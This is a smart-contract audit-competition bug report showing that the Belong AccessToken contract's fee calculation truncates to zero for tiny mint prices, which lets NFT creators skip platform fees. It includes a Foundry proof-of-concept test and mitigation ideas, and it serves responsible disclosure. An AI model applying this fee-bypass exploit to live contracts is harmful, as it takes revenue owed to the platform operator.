# 57877 sc high accesstoken creators can bypass fees so that platform address will receive 0 fees&#x20;

**Submitted on Oct 29th 2025 at 10:46:29 UTC by @ZestfulHedgehog609 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57877
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol>
* **Impacts:**
  * Theft of unclaimed royalties
  * Theft of unclaimed yield

## Description

### Brief/Intro

A user can create an AccessToken collection with the help of the `Factory.sol::produce()` function. Other users can mint these NFTs with their preferred metadata using the `mintStaticPrice()` or the `mintDynamicPrice()` functions for the amount specified by the owner of the NFT contract. A small fee is taken by the platform address when the NFTs are minted. But the owner of the NFT can choose an NFT mint price such that no fees are sent to the platform address and the full mint price is transferred to the NFT owner.

### Vulnerability Details

The problem is in the `_pay()` function.

```solidity
function _pay(uint256 price, address expectedPayingToken) private returns (uint256 amount) {
    AccessTokenParameters memory _parameters = parameters;
    Factory.FactoryParameters memory factoryParameters = _parameters.factory.nftFactoryParameters();

    amount = expectedPayingToken == NATIVE_CURRENCY_ADDRESS ? msg.value : price;

    require(amount == price, IncorrectNativeCurrencyAmountSent(amount));

    uint256 fees = (amount * factoryParameters.platformCommission) / PLATFORM_COMISSION_DENOMINATOR;
    //999*10/10,000 ==0.
    uint256 amountToCreator;
    unchecked {
        amountToCreator = amount - fees;
        // full price of the nft amount to the creator because fees=0.
    }
}
/////
//// rest of the code
////
 if (expectedPayingToken == NATIVE_CURRENCY_ADDRESS) {
    if (fees > 0) {
        factoryParameters.platformAddress.safeTransferETH(fees);
        // This line will not trigger because fees is 0
    }
    if (referralFees > 0) {
        refferalCreator.safeTransferETH(referralFees);
    }
    _parameters.creator.safeTransferETH(amountToCreator);
    // Full amount is transfered to the creator of the nft.
}
```

When calculating the fees, a user can make the `price` of the NFT so small that `amount * factoryParameters.platformCommission` is less than `PLATFORM_COMISSION_DENOMINATOR`. Due to integer division/truncation in Solidity, this results in `fees` being 0. There is no subsequent check inside the function to prevent `fees == 0`. Therefore the full amount is sent to the creator of the NFT and the platform receives no fee.

### Impact Details

The platform will suffer a loss because it will not receive any fees from the minting of these NFTs. NFT owners can set many NFTs to low prices so that they avoid platform fees entirely.

### References

* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L320>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L328>

## Proof of Concept

The following test demonstrates how minting with a small price results in platform fees being zeroed out.

{% stepper %}
{% step %}

### Setup (initialize a Foundry project)

1. Initialize a Foundry project.
2. Paste the repository files mentioned in the test into the `src` folder.
3. Create a test file called `AccesTokenTest.t.sol` in the `test` folder.
   {% endstep %}

{% step %}

### Run the test

Run:

```
forge test --mt test_Bypass_Platform_Fee -vvv
```

{% endstep %}

{% step %}

### Test code

Paste the following test into `test/AccesTokenTest.t.sol`:

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.27;

import {Test,console} from "../lib/forge-std/src/Test.sol";
import {AccessToken} from "../src/AccessToken.sol";
import {CreditToken} from "../src/CreditToken.sol";
import {RoyaltiesReceiverV2} from "../src/RoyaltiesReceiverV2.sol";
import {VestingWalletExtended} from "../src/VestingWalletExtended.sol";
import {Factory} from "../src/Factory.sol";
import {SignatureVerifier} from "../src/SignatureVerifier.sol";
import {StaticPriceParameters,AccessTokenInfo, NftMetadata, ERC1155Info, VestingWalletInfo} from "../src/Structures.sol";
import {ERC1967Factory} from "solady/src/utils/ERC1967Factory.sol";

contract AccesTokenTest is Test{
    Factory implementation;
    Factory factory;
    address accessToken;
    address creditToken;
    address royaltiesReceiver;
    address vestingWallet;
    address proxy;
    ERC1967Factory erc1967Factory;
    address user=makeAddr("user");
    Account buyer=makeAccount("buyer");
    address platformAddr=makeAddr("platformAddr");
    Account signerAccount=makeAccount("SignerAccount");
    address transferValidator=makeAddr("transferValidator");
    address native=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
     bytes32 hashedCode;
    function setUp() external{
        /////////////////////
        //deploy the factory
        ////////////////////
        erc1967Factory=new ERC1967Factory();
        implementation =new Factory();
        proxy=erc1967Factory.deploy(address(implementation),address(this));
        factory=Factory(address(proxy));
        accessToken=address(new AccessToken());
        creditToken=address(new CreditToken());
        royaltiesReceiver=address(new RoyaltiesReceiverV2());
        vestingWallet=address(new VestingWalletExtended());
        //set up with 1% fees for the platform address
        Factory.FactoryParameters memory facparam= Factory.FactoryParameters (platformAddr,signerAccount.addr,native,10,4,transferValidator);
         Factory.RoyaltiesParameters memory royparam=Factory.RoyaltiesParameters(1000,10);
         Factory.Implementations memory impl=Factory.Implementations (accessToken,creditToken,royaltiesReceiver,vestingWallet);
         uint16[5] memory percentages = [uint16(100), uint16(100), uint16(100), uint16(100), uint16(100)];
         ////////////////////////
         //initialize the factory
         ///////////////////////
        factory.initialize(facparam,royparam,impl,percentages);
        hashedCode=factory.createReferralCode();

    }

    function test_Bypass_Platform_Fee() external{
        string memory contractUri="nft.";
        NftMetadata memory nftmetadata=NftMetadata("NFT","nft");
        bytes32 hash=keccak256(abi.encodePacked(nftmetadata.name,nftmetadata.symbol,contractUri,uint96(0),block.chainid));
        (uint8 v, bytes32 r , bytes32 s)=vm.sign(signerAccount.key,hash);
        bytes memory sig=abi.encodePacked(r,s,v);
        //make the token buying price small so that truncation will cause fees to be 0.
        AccessTokenInfo memory acctknInfo=AccessTokenInfo(native,uint96(0),true,10e18,999,999,0,nftmetadata,contractUri,sig);
        //////////////////
        // deploy the nft
        /////////////////
        vm.prank(user);
        address nftAddr= factory.produce(acctknInfo,hashedCode);
        bytes32 buySigHash=keccak256(abi.encodePacked(buyer.addr,uint256(1),"my nft",false,block.chainid));
         (uint8 _v, bytes32 _r , bytes32 _s)=vm.sign(signerAccount.key,buySigHash);
         bytes memory tokenBuySig=abi.encodePacked(_r,_s,_v);
         StaticPriceParameters memory tokenParam= StaticPriceParameters(1,false,"my nft",tokenBuySig);
          StaticPriceParameters[] memory tokenParamArray=new StaticPriceParameters[](1);
          tokenParamArray[0]=tokenParam;
          ////////////////////
          //buyer buys the nft
          ///////////////////
          vm.startPrank(buyer.addr);
          deal(buyer.addr,1e18);
          console.log("balance of user before nft purchase:",user.balance);
          AccessToken(nftAddr).mintStaticPrice{value:999}(buyer.addr,tokenParamArray,native,999);
          console.log("balance of user after nft purchase:",user.balance);
          console.log("balance of platform fee receiver:", platformAddr.balance);
          vm.stopPrank();
        
    }
}
```

{% endstep %}

{% step %}

### Expected / Observed result

Logs from the test run:

* Ran 1 test for test/AccesTokenTest.t.sol:AccesTokenTest
* \[PASS] test\_Bypass\_Platform\_Fee() (gas: 952889)

Observed logs:

* balance of user before nft purchase: 0
* balance of user after nft purchase: 999
* balance of platform fee receiver: 0

As shown, the platform received 0 fees while the creator received the full mint amount.
{% endstep %}
{% endstepper %}

## Notes

* The vulnerability arises from integer truncation when computing small fee amounts: (amount \* platformCommission) / PLATFORM\_COMISSION\_DENOMINATOR can evaluate to zero for small amounts.
* Mitigation approaches (not exhaustive and not added to the report text): enforce a minimum fee floor, revert when fees == 0 and platformCommission > 0, or compute fees using higher precision (e.g., require price >= denominator / gcd(denominator, platformCommission) or use fixed-point arithmetic). (No fixes were added to source code here; these are general mitigation ideas and are not part of the original report.)
